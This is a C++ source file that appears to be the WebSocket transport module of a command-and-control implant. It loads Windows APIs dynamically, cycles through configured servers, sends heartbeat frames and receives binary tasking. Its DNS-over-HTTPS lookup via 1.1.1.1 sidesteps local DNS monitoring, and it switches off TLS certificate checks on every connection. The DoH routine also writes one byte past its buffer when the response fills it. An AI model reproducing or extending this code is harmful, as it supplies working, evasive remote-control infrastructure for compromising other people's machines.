#include "ConnectorWS.h"  
#include "ApiLoader.h"  
#include "ApiDefines.h"  
#include "utils.h"  
#include "Encoders.h"  

ConnectorWS::ConnectorWS()
{
#if defined(DEBUG)  
	ApiWin->printf("[WS] Initializing ConnectorWS...\n");
#endif  

	this->hSession = NULL;
	this->hConnect = NULL;
	this->hWebSocket = NULL;
	this->connected = FALSE;
	this->recvData = NULL;
	this->recvSize = 0;
	this->server_index = 0;
	this->user_agent = NULL;
	this->ssl = FALSE;
	this->server_count = 0;
	this->server_address = NULL;
	this->server_ports = NULL;
	this->ws_path = NULL;
}

BOOL ConnectorWS::SetConfig(ProfileWS profile, BYTE* beat, ULONG beatSize)
{
#if defined(DEBUG)  
	ApiWin->printf("[WS] SetConfig called\n");
#endif  

	this->server_count = profile.servers_count;
	this->server_address = (CHAR**)profile.servers;
	this->server_ports = profile.ports;
	this->ssl = profile.use_ssl;
	this->ws_path = (CHAR*)profile.ws_path;
	this->user_agent = (CHAR*)profile.user_agent;
	//
	//#if defined(DEBUG)  
	//	ApiWin->printf("[WS] Server count:%d\n", this->server_count);
	//	for (ULONG i = 0; i < this->server_count; i++) {
	//		ApiWin->printf("[WS] Server %d: %s:%d\n", i, this->server_address[i], this->server_ports[i]);
	//	}
	//	ApiWin->printf("[WS] WS Path: %s\n", this->ws_path);
	//	ApiWin->printf("[WS] User-Agent: %s\n", this->user_agent);
	//	ApiWin->printf("[WS] SSL: %s\n", this->ssl ? "true" : "false");
	//#endif  

	return TRUE;
}


BOOL ConnectorWS::Connect()
{
#if defined(DEBUG)    
	ApiWin->printf("[WS] Connect() called\n");
#endif    

	if (this->connected) {
		return TRUE;
	}

	ULONG attempt = 0;
	while (attempt < this->server_count) {
#if defined(DEBUG)    
		ApiWin->printf("[WS] Attempt %d: Connecting to %s:%d\n",
			attempt,
			this->server_address[this->server_index],
			this->server_ports[this->server_index]);
#endif    

		WCHAR userAgentW[256];
		ApiWin->MultiByteToWideChar(CP_ACP, 0, this->user_agent, -1, userAgentW, 256);

		if (!this->hSession) {
			this->hSession = ApiWin->WinHttpOpen(
				userAgentW,
				WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
				WINHTTP_NO_PROXY_NAME,
				WINHTTP_NO_PROXY_BYPASS,
				0
			);

			if (!this->hSession) {
#if defined(DEBUG)    
				ApiWin->printf("[WS] ERROR: WinHttpOpen failed, error=%d\n", ApiWin->GetLastError());
#endif    
				attempt++;
				this->server_index = (this->server_index + 1) % this->server_count;
				continue;
			}
		}

		// ===== 添加 DoH 解析逻辑 =====  
		CHAR resolvedIP[16] = { 0 };
		CHAR* serverToConnect = this->server_address[this->server_index];

		// 检测是否为IP地址  
		BOOL isIP = TRUE;
		CHAR* p = this->server_address[this->server_index];
		int dotCount = 0;
		while (*p) {
			if (*p == '.') {
				dotCount++;
			}
			else if (*p < '0' || *p > '9') {
				isIP = FALSE;
				break;
			}
			p++;
		}
		if (dotCount != 3) isIP = FALSE;

		// 如果是域名,使用 DoH 解析  
		if (!isIP) {
#if defined(DEBUG)    
			ApiWin->printf("[WS] Detected domain name, using DoH to resolve: %s\n", serverToConnect);
#endif  
			if (ResolveDomainViaDoh(serverToConnect, resolvedIP, sizeof(resolvedIP))) {
#if defined(DEBUG)    
				ApiWin->printf("[WS] DoH resolved %s to %s\n", serverToConnect, resolvedIP);
#endif  
				serverToConnect = resolvedIP;
			}
			else {
#if defined(DEBUG)    
				ApiWin->printf("[WS] DoH resolution failed, trying next server\n");
#endif  
				attempt++;
				this->server_index = (this->server_index + 1) % this->server_count;
				continue;
			}
		}
		// ===== DoH 解析逻辑结束 =====  

		WCHAR serverW[256];
		ApiWin->MultiByteToWideChar(CP_ACP, 0, serverToConnect, -1, serverW, 256);

		this->hConnect = ApiWin->WinHttpConnect(
			this->hSession,
			serverW,
			this->server_ports[this->server_index],
			0
		);

		if (!this->hConnect) {
#if defined(DEBUG)    
			ApiWin->printf("[WS] ERROR: WinHttpConnect failed, error=%d\n", ApiWin->GetLastError());
#endif    
			attempt++;
			this->server_index = (this->server_index + 1) % this->server_count;
			continue;
		}

		// ... 其余代码保持不变 ...  
		WCHAR wsPathW[256];
		ApiWin->MultiByteToWideChar(CP_ACP, 0, this->ws_path, -1, wsPathW, 256);

		DWORD flags = WINHTTP_FLAG_REFRESH;
		if (this->ssl) {
			flags |= WINHTTP_FLAG_SECURE;
		}

		HINTERNET hRequest = ApiWin->WinHttpOpenRequest(
			this->hConnect,
			L"GET",
			wsPathW,
			NULL,
			WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			flags
		);

		if (!hRequest) {
#if defined(DEBUG)    
			ApiWin->printf("[WS] ERROR: WinHttpOpenRequest failed, error=%d\n", ApiWin->GetLastError());
#endif    
			ApiWin->WinHttpCloseHandle(this->hConnect);
			this->hConnect = NULL;
			attempt++;
			this->server_index = (this->server_index + 1) % this->server_count;
			continue;
		}

		if (this->ssl) {
			DWORD dwFlags = 0;
			DWORD dwBufferSize = sizeof(dwFlags);

			BOOL result = ApiWin->WinHttpQueryOption(
				hRequest,
				WINHTTP_OPTION_SECURITY_FLAGS,
				&dwFlags,
				&dwBufferSize
			);

			if (result) {
				dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA |
					SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
					SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

				ApiWin->WinHttpSetOption(
					hRequest,
					WINHTTP_OPTION_SECURITY_FLAGS,
					&dwFlags,
					sizeof(dwFlags)
				);

#if defined(DEBUG)    
				ApiWin->printf("[WS] SSL certificate validation disabled\n");
#endif    
			}
		}

		if (!ApiWin->WinHttpSetOption(
			hRequest,
			WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
			NULL,
			0
		)) {
#if defined(DEBUG)    
			ApiWin->printf("[WS] ERROR: WinHttpSetOption failed, error=%d\n", ApiWin->GetLastError());
#endif    
			ApiWin->WinHttpCloseHandle(hRequest);
			ApiWin->WinHttpCloseHandle(this->hConnect);
			this->hConnect = NULL;
			attempt++;
			this->server_index = (this->server_index + 1) % this->server_count;
			continue;
		}

		if (!ApiWin->WinHttpSendRequest(
			hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0,
			WINHTTP_NO_REQUEST_DATA,
			0,
			0,
			0
		)) {
#if defined(DEBUG)    
			ApiWin->printf("[WS] ERROR: WinHttpSendRequest failed, error=%d\n", ApiWin->GetLastError());
#endif    
			ApiWin->WinHttpCloseHandle(hRequest);
			ApiWin->WinHttpCloseHandle(this->hConnect);
			this->hConnect = NULL;
			attempt++;
			this->server_index = (this->server_index + 1) % this->server_count;
			continue;
		}

		if (!ApiWin->WinHttpReceiveResponse(hRequest, NULL)) {
#if defined(DEBUG)    
			ApiWin->printf("[WS] ERROR: WinHttpReceiveResponse failed, error=%d\n", ApiWin->GetLastError());
#endif    
			ApiWin->WinHttpCloseHandle(hRequest);
			ApiWin->WinHttpCloseHandle(this->hConnect);
			this->hConnect = NULL;
			attempt++;
			this->server_index = (this->server_index + 1) % this->server_count;
			continue;
		}

		DWORD statusCode = 0;
		DWORD statusCodeSize = sizeof(statusCode);
		if (!ApiWin->WinHttpQueryHeaders(
			hRequest,
			WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
			WINHTTP_HEADER_NAME_BY_INDEX,
			&statusCode,
			&statusCodeSize,
			WINHTTP_NO_HEADER_INDEX
		)) {
#if defined(DEBUG)    
			ApiWin->printf("[WS] ERROR: WinHttpQueryHeaders failed, error=%d\n", ApiWin->GetLastError());
#endif    
			ApiWin->WinHttpCloseHandle(hRequest);
			ApiWin->WinHttpCloseHandle(this->hConnect);
			this->hConnect = NULL;
			attempt++;
			this->server_index = (this->server_index + 1) % this->server_count;
			continue;
		}

#if defined(DEBUG)    
		ApiWin->printf("[WS] HTTP status code: %d\n", statusCode);
#endif    

		if (statusCode != 101) {
#if defined(DEBUG)    
			ApiWin->printf("[WS] ERROR: Expected status 101, got %d\n", statusCode);
#endif    
			ApiWin->WinHttpCloseHandle(hRequest);
			ApiWin->WinHttpCloseHandle(this->hConnect);
			this->hConnect = NULL;
			attempt++;
			this->server_index = (this->server_index + 1) % this->server_count;
			continue;
		}

		this->hWebSocket = ApiWin->WinHttpWebSocketCompleteUpgrade(hRequest, 0);
		ApiWin->WinHttpCloseHandle(hRequest);

		if (!this->hWebSocket) {
#if defined(DEBUG)    
			ApiWin->printf("[WS] ERROR: WinHttpWebSocketCompleteUpgrade failed, error=%d\n", ApiWin->GetLastError());
#endif    
			ApiWin->WinHttpCloseHandle(this->hConnect);
			this->hConnect = NULL;
			attempt++;
			this->server_index = (this->server_index + 1) % this->server_count;
			continue;
		}

#if defined(DEBUG)    
		ApiWin->printf("[WS] WebSocket connection established\n");
#endif    

		this->connected = TRUE;
		return TRUE;
	}

#if defined(DEBUG)    
	ApiWin->printf("[WS] ERROR: Failed to connect after %d attempts\n", attempt);
#endif    

	return FALSE;
}

void ConnectorWS::SendData(BYTE* data, ULONG data_size)
{
#if defined(DEBUG)  
	ApiWin->printf("[WS] SendData() called, size=%d\n", data_size);
#endif  

	if (!this->connected) {
#if defined(DEBUG)  
		ApiWin->printf("[WS] Not connected, attempting to connect...\n");
#endif  
		if (!this->Connect()) {
#if defined(DEBUG)  
			ApiWin->printf("[WS] ERROR: Failed to connect\n");
#endif  
			return;
		}
	}

	if (!this->hWebSocket) {
#if defined(DEBUG)  
		ApiWin->printf("[WS] ERROR: WebSocket handle is NULL\n");
#endif  
		return;
	}

	if (data == NULL || data_size == 0) {
#if defined(DEBUG)  
		ApiWin->printf("[WS] Sending empty heartbeat frame\n");
#endif  
		BYTE emptyData[4] = { 0, 0, 0, 0 };
		DWORD error = ApiWin->WinHttpWebSocketSend(
			this->hWebSocket,
			WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
			emptyData,
			4
		);

		if (error != NO_ERROR) {
#if defined(DEBUG)  
			ApiWin->printf("[WS] ERROR: WinHttpWebSocketSend failed, error=%d\n", error);
#endif  
			this->connected = FALSE;
		}
		return;
	}

#if defined(DEBUG)  
	ApiWin->printf("[WS] Sending data frame\n");
#endif  

	DWORD error = ApiWin->WinHttpWebSocketSend(
		this->hWebSocket,
		WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
		data,
		data_size
	);

	if (error != NO_ERROR) {
#if defined(DEBUG)  
		ApiWin->printf("[WS] ERROR: WinHttpWebSocketSend failed, error=%d\n", error);
#endif  
		this->connected = FALSE;
		return;
	}

#if defined(DEBUG)  
	ApiWin->printf("[WS] Data sent successfully\n");
#endif  
}

BYTE* ConnectorWS::RecvData()
{
#if defined(DEBUG)      
	ApiWin->printf("[WS] RecvData() called\n");
#endif      

	if (!this->connected || !this->hWebSocket) {
#if defined(DEBUG)      
		ApiWin->printf("[WS] ERROR: Not connected or WebSocket handle is NULL\n");
#endif      
		return NULL;
	}

	// 清理之前的数据  
	if (this->recvData) {
		ApiWin->LocalFree(this->recvData);
		this->recvData = NULL;
		this->recvSize = 0;
	}

	// 临时缓冲区用于接收每个帧  
	DWORD tempBufferSize = 65536;
	BYTE* tempBuffer = (BYTE*)ApiWin->LocalAlloc(LPTR, tempBufferSize);
	if (!tempBuffer) {
#if defined(DEBUG)      
		ApiWin->printf("[WS] ERROR: Failed to allocate temp buffer\n");
#endif      
		return NULL;
	}

	// 完整消息缓冲区  
	BYTE* fullBuffer = NULL;
	DWORD totalBytesRead = 0;
	WINHTTP_WEB_SOCKET_BUFFER_TYPE bufferType;

	// 循环接收所有分片  
	do {
		DWORD bytesRead = 0;
		DWORD error = ApiWin->WinHttpWebSocketReceive(
			this->hWebSocket,
			tempBuffer,
			tempBufferSize,
			&bytesRead,
			&bufferType
		);

		if (error != NO_ERROR) {
#if defined(DEBUG)      
			ApiWin->printf("[WS] ERROR: WinHttpWebSocketReceive failed, error=%d\n", error);
#endif      
			if (fullBuffer) {
				ApiWin->LocalFree(fullBuffer);
			}
			ApiWin->LocalFree(tempBuffer);
			this->connected = FALSE;
			return NULL;
		}

#if defined(DEBUG)      
		ApiWin->printf("[WS] Received fragment: %d bytes, buffer type=%d\n", bytesRead, bufferType);
#endif      

		if (bytesRead == 0) {
			break;
		}

		// 扩展完整消息缓冲区  
		if (fullBuffer == NULL) {
			fullBuffer = (BYTE*)ApiWin->LocalAlloc(LPTR, bytesRead);
		}
		else {
			fullBuffer = (BYTE*)ApiWin->LocalReAlloc(fullBuffer, totalBytesRead + bytesRead, LMEM_MOVEABLE);
		}

		if (!fullBuffer) {
#if defined(DEBUG)      
			ApiWin->printf("[WS] ERROR: Failed to allocate/reallocate full buffer\n");
#endif      
			ApiWin->LocalFree(tempBuffer);
			return NULL;
		}

		// 追加数据到完整缓冲区  
		memcpy(fullBuffer + totalBytesRead, tempBuffer, bytesRead);
		totalBytesRead += bytesRead;

	} while (bufferType == WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE);

	ApiWin->LocalFree(tempBuffer);

#if defined(DEBUG)      
	ApiWin->printf("[WS] Total received: %d bytes\n", totalBytesRead);
#endif      

	if (totalBytesRead < 4) {
#if defined(DEBUG)      
		ApiWin->printf("[WS] ERROR: Received data too small (%d bytes)\n", totalBytesRead);
#endif      
		if (fullBuffer) {
			ApiWin->LocalFree(fullBuffer);
		}
		return NULL;
	}

	// 存储完整数据  
	this->recvData = fullBuffer;
	this->recvSize = totalBytesRead;

#if defined(DEBUG)      
	ApiWin->printf("[WS] Returning data pointer (%d bytes)\n", this->recvSize);
#endif      

	return this->recvData;
}
int ConnectorWS::RecvSize()
{
#if defined(DEBUG)  
	ApiWin->printf("[WS] RecvSize() returning %d\n", this->recvSize);
#endif  
	return this->recvSize;
}

void ConnectorWS::RecvClear()
{
#if defined(DEBUG)  
	ApiWin->printf("[WS] RecvClear() called\n");
#endif  

	if (this->recvData && this->recvSize > 0) {
		memset(this->recvData, 0, this->recvSize);
		ApiWin->LocalFree(this->recvData);
		this->recvData = NULL;
		this->recvSize = 0;
	}
}

void ConnectorWS::CloseConnector()
{
#if defined(DEBUG)  
	ApiWin->printf("[WS] CloseConnector() called\n");
#endif  

	if (this->hWebSocket) {
		ApiWin->WinHttpWebSocketClose(
			this->hWebSocket,
			WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
			NULL,
			0
		);
		ApiWin->WinHttpCloseHandle(this->hWebSocket);
		this->hWebSocket = NULL;
	}

	if (this->hConnect) {
		ApiWin->WinHttpCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}

	if (this->hSession) {
		ApiWin->WinHttpCloseHandle(this->hSession);
		this->hSession = NULL;
	}

	this->connected = FALSE;

#if defined(DEBUG)  
	ApiWin->printf("[WS] Connector closed\n");
#endif  
}


CHAR* StrStrA(CHAR* haystack, CHAR* needle)
{
	if (!haystack || !needle)
		return NULL;

	DWORD needleLen = StrLenA(needle);
	if (needleLen == 0)
		return haystack;

	while (*haystack) {
		if (StrNCmpA(haystack, needle, needleLen) == 0)
			return haystack;
		haystack++;
	}

	return NULL;
}
BOOL ResolveDomainViaDoh(CHAR* domain, CHAR* ipAddress, DWORD ipAddressSize)
{
#if defined(DEBUG)  
	ApiWin->printf("[DoH] Resolving domain: %s\n", domain);
#endif  

	CHAR dohUrl[512];
	DWORD urlLen = 0;


	memcpy(dohUrl + urlLen, "/dns-query?name=", 16); urlLen += 16;
	DWORD domainLen = StrLenA(domain);
	memcpy(dohUrl + urlLen, domain, domainLen); urlLen += domainLen;
	memcpy(dohUrl + urlLen, "&type=A", 7); urlLen += 7;
	dohUrl[urlLen] = 0;

	WCHAR userAgent[] = L"Mozilla/5.0";
	HINTERNET hSession = ApiWin->WinHttpOpen(
		userAgent,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		0
	);

	if (!hSession) {
#if defined(DEBUG)  
		ApiWin->printf("[DoH] ERROR: WinHttpOpen failed\n");
#endif  
		return FALSE;
	}

	HINTERNET hConnect = ApiWin->WinHttpConnect(
		hSession,
		L"1.1.1.1",
		443,
		0
	);

	if (!hConnect) {
#if defined(DEBUG)  
		ApiWin->printf("[DoH] ERROR: WinHttpConnect failed\n");
#endif  
		ApiWin->WinHttpCloseHandle(hSession);
		return FALSE;
	}

	WCHAR dohUrlW[512];
	MultiByteToWideChar(CP_ACP, 0, dohUrl, -1, dohUrlW, 512);

	HINTERNET hRequest = ApiWin->WinHttpOpenRequest(
		hConnect,
		L"GET",
		dohUrlW,
		NULL,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		WINHTTP_FLAG_SECURE
	);

	if (!hRequest) {
#if defined(DEBUG)  
		ApiWin->printf("[DoH] ERROR: WinHttpOpenRequest failed\n");
#endif  
		ApiWin->WinHttpCloseHandle(hConnect);
		ApiWin->WinHttpCloseHandle(hSession);
		return FALSE;
	}

	WCHAR acceptHeader[] = L"Accept: application/dns-json\r\n";
	ApiWin->WinHttpAddRequestHeaders(
		hRequest,
		acceptHeader,
		-1,
		WINHTTP_ADDREQ_FLAG_ADD
	);

	DWORD dwFlags;
	DWORD dwBuffer = sizeof(DWORD);
	if (ApiWin->WinHttpQueryOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer)) {
		dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
		ApiWin->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	}

	if (!ApiWin->WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
#if defined(DEBUG)  
		ApiWin->printf("[DoH] ERROR: WinHttpSendRequest failed\n");
#endif  
		ApiWin->WinHttpCloseHandle(hRequest);
		ApiWin->WinHttpCloseHandle(hConnect);
		ApiWin->WinHttpCloseHandle(hSession);
		return FALSE;
	}

	if (!ApiWin->WinHttpReceiveResponse(hRequest, NULL)) {
#if defined(DEBUG)  
		ApiWin->printf("[DoH] ERROR: WinHttpReceiveResponse failed\n");
#endif  
		ApiWin->WinHttpCloseHandle(hRequest);
		ApiWin->WinHttpCloseHandle(hConnect);
		ApiWin->WinHttpCloseHandle(hSession);
		return FALSE;
	}

	DWORD bytesAvailable = 0;
	DWORD bytesRead = 0;
	BYTE buffer[4096];
	DWORD totalBytes = 0;

	while (ApiWin->WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
		if (bytesAvailable > sizeof(buffer) - totalBytes) {
			bytesAvailable = sizeof(buffer) - totalBytes;
		}

		if (!ApiWin->WinHttpReadData(hRequest, buffer + totalBytes, bytesAvailable, &bytesRead)) {
			break;
		}

		totalBytes += bytesRead;

		if (totalBytes >= sizeof(buffer)) {
			break;
		}
	}

	buffer[totalBytes] = 0;

#if defined(DEBUG)  
	ApiWin->printf("[DoH] Received %d bytes\n", totalBytes);
#endif  

	CHAR* answerPos = StrStrA((CHAR*)buffer, (CHAR*)"\"Answer\"");
	if (!answerPos) {
#if defined(DEBUG)  
		ApiWin->printf("[DoH] ERROR: No Answer field in response\n");
#endif  
		ApiWin->WinHttpCloseHandle(hRequest);
		ApiWin->WinHttpCloseHandle(hConnect);
		ApiWin->WinHttpCloseHandle(hSession);
		return FALSE;
	}

	CHAR* dataPos = StrStrA(answerPos, (CHAR*)"\"data\":\"");
	if (!dataPos) {
#if defined(DEBUG)  
		ApiWin->printf("[DoH] ERROR: No data field in Answer\n");
#endif  
		ApiWin->WinHttpCloseHandle(hRequest);
		ApiWin->WinHttpCloseHandle(hConnect);
		ApiWin->WinHttpCloseHandle(hSession);
		return FALSE;
	}

	dataPos += 8;

	DWORD ipLen = 0;
	while (dataPos[ipLen] != '"' && dataPos[ipLen] != 0 && ipLen < ipAddressSize - 1) {
		ipAddress[ipLen] = dataPos[ipLen];
		ipLen++;
	}
	ipAddress[ipLen] = 0;

#if defined(DEBUG)  
	ApiWin->printf("[DoH] Resolved IP: %s\n", ipAddress);
#endif  

	ApiWin->WinHttpCloseHandle(hRequest);
	ApiWin->WinHttpCloseHandle(hConnect);
	ApiWin->WinHttpCloseHandle(hSession);

	return TRUE;
}